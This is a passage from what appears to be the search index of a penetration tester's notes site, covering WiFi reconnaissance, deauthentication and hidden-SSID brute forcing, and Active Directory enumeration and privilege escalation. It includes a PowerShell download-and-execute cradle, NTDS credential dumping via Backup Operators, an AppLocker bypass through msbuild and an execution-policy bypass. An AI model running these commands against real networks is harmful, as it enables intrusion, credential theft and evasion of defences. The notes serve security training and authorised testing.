B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon\n</code></pre> <p>After sending the deauthentication requests using <code>aireplay-ng</code>, we should see the name of the hidden SSID appear in <code>airodump-ng</code> once the client reconnects to the WiFi network. This process leverages the re-association reques</p> <p>airodump output: <pre><code>sudo airodump-ng -c 1 wlan0mon\n\nCH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45 \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\n\n B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  jacklighters\n\n BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\n\n B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4         jacklighters\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Finding%20Hidden%20Networks/#bruteforcing-hidden-ssid","title":"Bruteforcing Hidden SSID","text":"<p>We can use a tool like mdk3 to carry out this attack. With mdk3, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names.</p> <p><pre><code>mdk3 &lt;interface&gt; &lt;test mode&gt; [test_ options]\n</code></pre> The <code>p</code> test mode argument in mdk3 stands for Basic probing and ESSID Bruteforce mode.</p> Option Description <code>-e</code> Specify the SSID for probing. <code>-f</code> Read lines from a file for brute-forcing hidden SSIDs. <code>-t</code> Set the MAC address of the target AP. <code>-s</code> Set the speed (Default: unlimited, in Bruteforce mode: 300). <code>-b</code> Use full brute-force mode (recommended for short SSIDs only). This switch is used to show its help screen To bruteforce with all possible values, we can use <code>-b</code> as the <code>test_option</code> in mdk3. We can set the following options for it. <ul> <li>upper case (u)</li> <li>digits (n)</li> <li>all printed (a)</li> <li>lower and upper case (c)</li> <li>lower and upper case plus numbers (m)</li> </ul> <pre><code>sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4\n</code></pre> <p>or use a wordlist</p> <pre><code>sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/","title":"Interface Modes","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/#managed-mode","title":"Managed Mode","text":"<p>This is usually the default mode for interfaces <pre><code> sudo ifconfig wlan0 down\n sudo iwconfig wlan0 mode managed\n</code></pre> This mode allows us to authenticate and associate to an access point, basic service set, and others.</p> <p>Connect to network:</p> <pre><code>sudo iwconfig wlan0 essid WIFI-TEST\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/#ad-hoc-mode","title":"Ad-hoc Mode","text":"<p>This mode is peer to peer and allows wireless interfaces to communicate directly to one another. This mode is commonly found in most residential mesh systems for their backhaul bands.  <code>bash  sudo iwconfig wlan0 mode ad-hoc</code> and connect <pre><code>sudo iwconfig wlan0 essid WIFI-TEST\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/#master-mode","title":"Master Mode","text":"<p>access point / router mode. This mode cannot be set with iwconfig because a management daemon is required. The easiest setup for this is using <code>hostapd</code> Sample config: <pre><code>$ nano open.conf\n</code></pre> <pre><code>interface=wlan0\ndriver=nl80211\nssid=WIFI-TEST\nchannel=2\nhw_mode=g\n</code></pre> This configuration would simply bring up an open network, start the network with the following command:  <pre><code>sudo hostapd open.conf\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/#mesh-mode","title":"Mesh Mode","text":"<p>we can set our interface to join a self-configuring and routing network. This mode is commonly used for business applications where there is a need for large coverage across a physical space. </p> <p>Check if its even possible with the current interface: <pre><code>sudo iw dev wlan0 set type mesh\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/#monitorpromiscuous-mode","title":"Monitor/Promiscuous Mode","text":"<p>In this mode, the network interface can capture all wireless traffic within its range, regardless of the intended recipient.  typically requires administrative privileges and may vary depending on the operating system and wireless chipset used</p> <ol> <li>Bring the interface down</li> </ol> <pre><code>sudo ifconfig wlan0 down\n</code></pre> <ol> <li>set the interfaces mode</li> </ol> <pre><code>sudo iw wlan0 set monitor control\n</code></pre> <ol> <li>bring our interface back up.</li> </ol> <pre><code>sudo ifconfig wlan0 up\n</code></pre> <ol> <li>confirm mode</li> </ol> <pre><code>iwconfig\n\nwlan0     IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   \n          Retry short  long limit:2   RTS thr:off   Fragment thr:off\n          Power Management:off\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Interface%20Modes/#note-on-capabilities","title":"Note on capabilities:","text":"<p>If we are attempting to exploit WEP, WPA, WPA2, WPA3, and all enterprise variants, we are likely sufficient with just monitor mode and packet injection capabilities However, suppose we were trying to achieve different actions we might consider the following capabilities.</p> <ol> <li><code>Employing a Rogue AP or Evil-Twin Attack:</code> - We would want our interface to support master mode with a management daemon like hostapd, hostapd-mana, hostapd-wpe, airbase-ng, and others.</li> <li><code>Backhaul and Mesh or Mesh-Type system exploitation:</code> - We would want to make sure our interface supports ad-hoc and mesh modes accordingly. For this kind of exploitation we are normally sufficient with monitor mode and packet injection, but the extra capabilities can allow us to perform node impersonation among others.</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Monitor%20Mode/","title":"Monitor Mode","text":"<p>Starting monitor mode</p> <p>Identify interface name <pre><code>sudo airmon-ng\n</code></pre></p> <p>Enable monitor mode</p> <pre><code>sudo airmon-ng start wlan0\n</code></pre> <p>When putting a card into monitor mode, it will automatically check for interfering processes. It can also be done manually by running the following command:</p> <pre><code>sudo airmon-ng check\n</code></pre> <p>we can terminate these processes using the airmon-ng check kill command.</p> <pre><code>sudo airmon-ng check kill\n</code></pre> <p>Use specific channel <pre><code>sudo airmon-ng start wlan0 11\n</code></pre></p> <p>monitor mode on channel 11. This ensures that the wlan0 interface operates specifically on channel 11 while in monitor mode.</p> <p>We can stop the monitor mode on the <code>wlan0mon</code> interface using the command <code>airmon-ng stop wlan0mon</code>.</p> <pre><code>sudo airmon-ng stop wlan0mon\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Reconnaissance/","title":"Reconnaissance","text":"<p>Enable monitor mode</p> <pre><code>sudo airmon-ng start wlan0\n</code></pre> <p>Confirm with iwconfig <pre><code>iwconfig\n\neth0      no wireless extensions.\n\nwlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   \n          Retry short limit:7   RTS thr:off   Fragment thr:off\n          Power Management:on\n\nlo        no wireless extensions.\n</code></pre></p> <p>now scan for networks</p> <p>This will output details about access points (including channel IDs) <pre><code>sudo airodump-ng wlan0mon\n</code></pre></p> <p>Scanning Specific Channels or a Single Channel</p> <p>The command <code>airodump-ng wlan0mon</code> initiates a comprehensive scan, collecting data on wireless access points across all the channels available. </p> <p>we can specify a particular channel using the <code>-c</code> option to focus the scan on a specific frequency. For instance, <code>-c 11</code> would narrow the scan to channel 11. This targeted approach can provide more refined results, especially in crowded Wi-Fi environments.</p> <pre><code>sudo airodump-ng -c 11 wlan0mon\n</code></pre> <p>It is also possible to select multiple channels for scanning using the command </p> <pre><code>airodump-ng -c 1,6,11 wlan0mon\n</code></pre> <p>Scanning 5 GHz Wi-Fi bands</p> <p>By default, airodump-ng is configured to scan exclusively for networks operating on the 2.4 GHz band. Nevertheless, if the wireless adapter is compatible with the 5 GHz band, we can instruct airodump-ng to include this frequency range in its scan by utilizing the <code>--band</code> option. You can find a list of all WLAN channels and bands available for Wi-Fi here.</p> <ul> <li><code>a</code> uses 5 GHz</li> <li><code>b</code> uses 2.4 GHz</li> <li><code>g</code> uses 2.4 GHz</li> </ul> <pre><code>sudo airodump-ng wlan0mon --band a\n</code></pre> <p>You can also dump across channels</p> <pre><code>sudo airodump-ng --band abg wlan0mon\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Reconnaissance/#capturing-traffic","title":"Capturing Traffic","text":"<p><pre><code>airodump-ng wlan0mon --write outFile \n</code></pre> will generate <code>.cap, .csv, kismet.csv, kismet.netxml, log.vsc</code> by default</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Reconnaissance/#reading-output","title":"Reading output","text":"<p>Cipher:</p> <ul> <li>CCMP = WPA2</li> <li>TKIP = WPA1</li> </ul> <p>Auth:</p> <ul> <li>PSK = Personal</li> <li>MG</li> <li>T = enterprise</li> </ul>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/","title":"Under Construction","text":"<p>The notes in this section are still being migrated and are incomplete</p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/","title":"Domain User Enumeration","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/#remote","title":"Remote","text":"<p>Multi-Protocol <pre><code>enum4linux -a &lt;IP&gt;\n</code></pre> SMB <pre><code>nxc smb &lt;IP&gt; -u '' -p '' --users\n</code></pre> RPC <pre><code>rpcclient -U \"\" -N &lt;IP&gt;\nenumdomusers\n</code></pre> <pre><code>queryuser 0x457 &lt;---user RID\n</code></pre> ldap <pre><code>ldapsearch -x -b \"DC=HTB,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\" -H ldap://&lt;IP&gt; | grep -i samaccountname: | cut -f 2 -d \" \"\n</code></pre> <pre><code>nxc ldap &lt;IP&gt; -u '' -p '' --users    \n</code></pre> <pre><code>python3 windapsearch.py --dc-ip &lt;dcip&gt; -u user@domain -p 'pass' --da\n</code></pre> <pre><code>python3 windapsearch.py --dc-ip &lt;dcip&gt; -u user@domain -p &lt;pass&gt; -PU\n</code></pre> Check logged in users <pre><code>nxc smb &lt;IP&gt; -u '' -p '' --loggedon-users\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/#brute-force-usernames","title":"Brute force usernames","text":"<pre><code>kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175\n</code></pre>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/#generate-userlists","title":"Generate userlists","text":"<p>Username Anarchy <pre><code>sudo apt install ruby -y\ngit clone https://github.com/urbanadventurer/username-anarchy.git\ncd username-anarchy\n</code></pre> <pre><code>./username-anarchy Jane Smith &gt; jane_smith_usernames.txt\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/#validate-known-usernames","title":"Validate Known Usernames","text":"<pre><code>kerberute userenum -d &lt;DOMAIN&gt; users.txt\n</code></pre> <p>Add a known negative user to make sure the server is properly validating.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/","title":"Domain Wide Enumeration","text":"","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#bloodhound","title":"Bloodhound","text":"<p>Remote ingestion <pre><code>nxc ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --bloodhound --collection All --dns-server &lt;DC-IP&gt;\n</code></pre> <pre><code>bloodhound-python -c All -u &lt;user&gt; -p &lt;pass&gt; -d domain.local -ns &lt;dc-ip&gt;\n</code></pre> <pre><code>sudo bloodhound-python -u 'user' -p 'pass' -ns &lt;dc-ip&gt; -d domain.local -c all \n</code></pre> <code>--use-ldaps</code> if ldaps</p> <p>Local Ingestion <pre><code>SharpHound.exe --CollectionMethods All\n</code></pre> <pre><code>Invoke-BloodHound -CollectionMethod All\n</code></pre> cypher queries</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#powerviewpy-remote","title":"powerview.py (remote)","text":"<p>https://github.com/aniqfakhrul/powerview.py</p> <p>Run powerview functions remotely over a persistent ldap bind.</p> <p>CLI: <pre><code>powerview range.net/lowpriv:Password123@192.168.86.192 --dc-ip 192.168.86.192 \n</code></pre> Web &amp; Cli <pre><code>powerview range.net/lowpriv:Password123@192.168.86.192 --web --web-host 0.0.0.0 --web-port 3000 --web-auth user:password1234\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#powerviewsharpview-local","title":"PowerView/Sharpview (local)","text":"<p>https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</p> Command Description <code>Export-PowerViewCSV</code> Append results to a CSV file <code>ConvertTo-SID</code> Convert a User or group name to its SID value <code>Get-DomainSPNTicket</code> Requests the Kerberos ticket for a specified Service Principal Name (SPN) account Domain/LDAP Functions: <code>Get-Domain</code> Will return the AD object for the current (or specified) domain <code>Get-DomainController</code> Return a list of the Domain Controllers for the specified domain <code>Get-DomainUser</code> Will return all users or specific user objects in AD <code>Get-DomainComputer</code> Will return all computers or specific computer objects in AD <code>Get-DomainGroup</code> Will return all groups or specific group objects in AD <code>Get-DomainOU</code> Search for all or specific OU objects in AD <code>Find-InterestingDomainAcl</code> Finds object ACLs in the domain with modification rights set to non-built in objects <code>Get-DomainGroupMember</code> Will return the members of a specific domain group <code>Get-DomainFileServer</code> Returns a list of servers likely functioning as file servers <code>Get-DomainDFSShare</code> Returns a list of all distributed file systems for the current (or specified) domain GPO Functions: <code>Get-DomainGPO</code> Will return all GPOs or specific GPO objects in AD <code>Get-DomainPolicy</code> Returns the default domain policy or the domain controller policy for the current domain Computer Enumeration Functions: <code>Get-NetLocalGroup</code> Enumerates local groups on the local or a remote machine <code>Get-NetLocalGroupMember</code> Enumerates members of a specific local group <code>Get-NetShare</code> Returns open shares on the local (or a remote) machine <code>Get-NetSession</code> Will return session information for the local (or a remote) machine <code>Test-AdminAccess</code> Tests if the current user has administrative access to the local (or a remote) machine Threaded 'Meta'-Functions: <code>Find-DomainUserLocation</code> Finds machines where specific users are logged in <code>Find-DomainShare</code> Finds reachable shares on domain machines <code>Find-InterestingDomainShareFile</code> Searches for files matching specific criteria on readable shares in the domain <code>Find-LocalAdminAccess</code> Find machines on the local domain where the current user has local administrator access Domain Trust Functions: <code>Get-DomainTrust</code> Returns domain trusts for the current domain or a specified domain <code>Get-ForestTrust</code> Returns all forest trusts for the current forest or a specified forest <code>Get-DomainForeignUser</code> Enumerates users who are in groups outside of the user's domain <code>Get-DomainForeignGroupMember</code> Enumerates groups with users outside of the group's domain and returns each foreign member <code>Get-DomainTrustMapping</code> Will enumerate all trusts for the current domain and any others seen. <p><pre><code>Get-DomainUser -Identity &lt;username&gt; -Domain &lt;domain.local&gt; | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n</code></pre> <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre> <pre><code>Get-DomainTrustMapping\n</code></pre> <pre><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n</code></pre> <pre><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#powershell","title":"Powershell","text":"<p><pre><code>Get-Module\n</code></pre> <pre><code>Import-Module ActiveDirectory\n</code></pre> <pre><code>Get-ADDomain\n</code></pre> <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> <pre><code>Get-ADTrust -Filter *\n</code></pre> <pre><code>Get-ADGroup -Filter * | select name\nGet-ADGroup -Identity \"Backup Operators\"\nGet-ADGroupMember -Identity \"Backup Operators\"\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Domain%20Wide%20Enumeration/#raw-ldap","title":"Raw LDAP","text":"<pre><code>ldapsearch -x -b \"DC=EGOTISTICAL-BANK,DC=LOCAL\" -H ldap://10.10.10.175\n</code></pre>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/","title":"Enumerating Security Controls","text":"","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#identify","title":"Identify","text":"","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#windows-defender","title":"Windows Defender","text":"<p><pre><code>Get-MpComputerStatus\n</code></pre> If RealTimeProtection: True, we have defender enabled</p>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#applocker","title":"AppLocker","text":"<pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#bypassing-policy-with-lolbas","title":"Bypassing Policy with LOLBAS","text":"<p>They exist in trusted paths (C:\\Windows and C:\\Program Files) and may also be digitally signed by Microsoft.  Examples: https://lolbas-project.github.io/ Example: msbuild.exe Build and execute a C# project stored in the target XML file:</p> helloworld.xml <pre><code>&lt;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"&gt;\n  &lt;Target Name=\"MSBuild\"&gt;\n   &lt;MSBuildTest/&gt;\n  &lt;/Target&gt;\n   &lt;UsingTask\n    TaskName=\"MSBuildTest\"\n    TaskFactory=\"CodeTaskFactory\"\n    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt;\n     &lt;Task&gt;\n      &lt;Code Type=\"Class\" Language=\"cs\"&gt;\n        &lt;![CDATA[\n\n            using System;\n            using Microsoft.Build.Framework;\n            using Microsoft.Build.Utilities;\n\n            public class MSBuildTest : Task, ITask\n            {\n                public override bool Execute()\n                {\n                    Console.WriteLine(\"Hello World\");\n                    return true;\n                }\n            }\n\n        ]]&gt;\n      &lt;/Code&gt;\n    &lt;/Task&gt;\n  &lt;/UsingTask&gt;\n&lt;/Project&gt;\n</code></pre> <pre><code>msbuild.exe helloworld.xml\n</code></pre> <p>note</p> <p>Organizations often block the <code>PowerShell.exe</code> executable, but forget about the other PowerShell executable locations such as <code>%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</code> or <code>PowerShell_ISE.exe</code></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#powershell-constrained-language-mode","title":"PowerShell Constrained Language Mode","text":"<p>Will prevent tons of useful powershell features <pre><code>$ExecutionContext.SessionState.LanguageMode\n</code></pre></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Enumerating%20Security%20Controls/#laps","title":"LAPS","text":"<p>https://github.com/leoloobeek/LAPSToolkit Can help us find ADUsers that have permissions to read LAPS passwords <pre><code>Find-LAPSDelegatedGroups\n</code></pre> The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with \"All Extended Rights.\" Users with \"All Extended Rights\" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for. <pre><code>Find-AdmPwdExtendedRights\n</code></pre> Find computers with laps enabled <pre><code>Get-LAPSComputers\n</code></pre></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/","title":"Group Membership","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/#identify","title":"Identify","text":"<ul> <li>Domain Admins<ul> <li>Full control of the domain and can manage all resources in the domain.</li> </ul> </li> <li>Enterprise Admins<ul> <li>This group exists in the root domain of a forest and has full rights to administer any domain within the forest.</li> </ul> </li> <li>Schema Admins<ul> <li>Members can modify the AD schema, which affects the entire forest. This group should have no permanent members unless schema changes are being made.</li> </ul> </li> <li>Administrators (Built-in)<ul> <li>By default, this group has wide-ranging administrative privileges on a domain controller.</li> </ul> </li> <li>Server Operators<ul> <li>Members can log on to domain controllers, start/stop services, format hard drives, and perform other significant administrative tasks.</li> </ul> </li> <li>Backup Operators<ul> <li>Members can bypass file permissions to back up and restore files across the domain controller. This often grants access to sensitive data.</li> </ul> </li> <li>Account Operators<ul> <li>Members can create, modify, and delete most user and group accounts (except for certain high-privilege groups), making them powerful with regard to identity management.</li> </ul> </li> <li>DNS Admins<ul> <li>Members manage DNS servers, which control name resolution. A compromise here can enable attacks like DNS poisoning or redirection.</li> </ul> </li> <li>Key Admins &amp; Enterprise Key Admins<ul> <li>Introduced in newer versions of Active Directory Certificate Services (AD CS); these groups can manage public key infrastructure (PKI) objects and certificate authorities.</li> </ul> </li> <li>Exchange Organization Management (if Microsoft Exchange is installed)<ul> <li>Members can administer all Exchange resources and mailboxes, with significant access to messaging data.</li> </ul> </li> </ul>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/#exploit","title":"Exploit","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/#backup-operators","title":"Backup Operators","text":"<p>Remote <pre><code>nxc smb &lt;target&gt; -u '' -p '' -M backup_operator\n</code></pre> Get machine account hash and dump ntds with that. <pre><code>nxc smb 172.16.210.5 -u 'DC01$' -H &lt;MachineAccHash&gt; --ntds --user Administrator\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Group%20Membership/#exchange-groups","title":"Exchange Groups","text":"<p>https://github.com/gdedrouas/Exchange-AD-Privesc</p> <p>Exchange Windows Permissions</p> <ul> <li>members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges.</li> </ul> <p>Organization Management</p> <ul> <li>access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.</li> </ul>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/","title":"Living Off the Land Enumeration","text":"","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#os-context","title":"OS Context","text":"<p>Basic enum commands</p> Command Result <code>hostname</code> Prints the PC's Name <code>[System.Environment]::OSVersion.Version</code> Prints out the OS version and revision level <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code> Prints the patches and hotfixes applied to the host <code>ipconfig /all</code> Prints out network adapter state and configurations <code>set</code> Displays a list of environment variables for the current session (ran from CMD-prompt) <code>echo %USERDOMAIN%</code> Displays the domain name to which the host belongs (ran from CMD-prompt) <code>echo %logonserver%</code> Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) <pre><code>systeminfo\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#powershell","title":"Powershell","text":"<p><pre><code>Get-Module\n</code></pre> <pre><code>Get-ExecutionPolicy -List\n</code></pre> <pre><code>Set-ExecutionPolicy Bypass -Scope Process\n</code></pre> <pre><code>Get-ChildItem Env: | ft Key,Value\n</code></pre> <pre><code>Get-Content $env:APPDATA\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\n</code></pre> <pre><code>powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#opsec-techniques","title":"OPSEC Techniques","text":"<pre><code>powershell.exe -version 2\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#checking-defenses","title":"Checking Defenses","text":"<p><pre><code>netsh advfirewall show allprofiles\n</code></pre> <pre><code>sc query windefend\n</code></pre> <pre><code>Get-MpComputerStatus\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#other-users-on-host","title":"Other users on host?","text":"<pre><code>qwinsta\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#network-information","title":"Network Information","text":"<pre><code>arp -a\nipconfig /all\nroute print\n</code></pre> <p>note</p> <p>Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment.</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":"<p><pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn\n</code></pre> <pre><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List\n</code></pre> <pre><code>wmic process list /format:list\n</code></pre> <pre><code>wmic ntdomain list /format:list\n</code></pre> <pre><code>wmic useraccount list /format:list\n</code></pre> <pre><code>wmic group list /format:list\n</code></pre> <pre><code>wmic sysaccount list /format:list\n</code></pre> https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Living%20Off%20the%20Land%20Enumeration/#net-commands","title":"Net Commands","text":"<p><pre><code>net accounts\n</code></pre> <pre><code>net accounts /domain\n</code></pre> <pre><code>net group /domain\n</code></pre> <pre><code>net group \"Domain Admins\" /domain\n</code></pre> <pre><code>net group \"domain computers\" /domain\n</code></pre> <pre><code>net group \"Domain Controllers\" /domain\n</code></pre> <pre><code>net group &lt;domain_group_name&gt; /domain\n</code></pre> <pre><code>net groups /domain\n</code></pre> List of domain groups <pre><code>net localgroup\n</code></pre> <pre><code>net localgroup administrators /domain\n</code></pre> <pre><code>net localgroup Administrators\n</code></pre> <pre><code>net localgroup administrators [username] /add\n</code></pre> <pre><code>net share\n</code></pre> <pre><code>net user &lt;ACCOUNT_NAME&gt; /domain\n</code></pre> <pre><code>net user /domain\n</code></pre> <pre><code>net user %username%\n</code></pre> Information about the current user <pre><code>net use x: \\computer\\share\n</code></pre> 